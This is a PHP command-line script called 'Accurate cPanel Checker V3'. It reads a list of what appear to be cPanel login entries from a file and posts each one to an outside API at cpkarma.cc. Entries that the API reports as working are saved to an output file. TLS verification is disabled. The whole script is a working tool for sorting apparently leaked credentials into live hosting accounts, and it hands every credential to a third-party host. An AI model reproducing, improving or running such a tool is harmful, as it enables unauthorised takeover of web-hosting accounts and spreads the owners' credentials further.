<?php
// ANSI color codes for terminal output
define('GREEN', "\033[32m");
define('RED', "\033[31m");
define('YELLOW', "\033[33m");
define('CYAN', "\033[36m");
define('RESET', "\033[0m");

echo GREEN . "\nAccurate cPanel Checker V3\n" . RESET . "\n";

// API endpoint (update this to your actual API URL)
$apiUrl = 'http://cpkarma.cc/v3api/api.php';

// Prompt for input and output files
$inputFile = trim(readline("Enter the input file (e.g., list.txt): "));
$outputFile = trim(readline("Enter the output file for working cPanels (e.g., working.txt): "));
echo "\n";

// Check if input file exists
if (!file_exists($inputFile) || !is_readable($inputFile)) {
    die(RED . "Error: $inputFile not found or unreadable.\n" . RESET);
}

$handle = fopen($inputFile, 'r');
if (!$handle) {
    die(RED . "Error: Could not open $inputFile.\n" . RESET);
}

// Function to send POST request to API
function checkCpanel($cpv3, $apiUrl) {
    $ch = curl_init();
    
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['cpv3' => $cpv3]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Enable in production if possible
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    
    curl_close($ch);
    
    if ($response === false || $httpCode != 200) {
        return ['status' => 'error', 'error' => $curlError ?: "HTTP $httpCode"];
    }
    
    return json_decode($response, true);
}

// Process each line
$total = 0;
$working = 0;

while (!feof($handle)) {
    $line = trim(fgets($handle));
    if (empty($line)) continue;
    
    $total++;
    
    // Send request to API
    $result = checkCpanel($line, $apiUrl);
    
    if ($result === null || !isset($result['status'])) {
        echo "$line > " . YELLOW . "Invalid API response\n" . RESET;
        continue;
    }
    
    // Display result
    switch ($result['status']) {
        case 'working':
            echo "$line > " . GREEN . "Working\n" . RESET;
            file_put_contents($outputFile, $line . PHP_EOL, FILE_APPEND | LOCK_EX);
            $working++;
            break;
        case 'not_working':
            echo "$line > " . RED . "Not Working\n" . RESET;
            break;
        case 'error':
            echo "$line > " . YELLOW . "Error: " . ($result['error'] ?? 'Unknown') . "\n" . RESET;
            break;
    }
    
    // Add a delay to avoid overwhelming the API
    sleep(1); // 1 second delay between requests
}

fclose($handle);

// Summary
echo "\n" . CYAN . "Summary:\n" . RESET;
echo "Total checked: $total\n";
echo "Working: $working\n";
echo "Results saved to $outputFile\n";
?>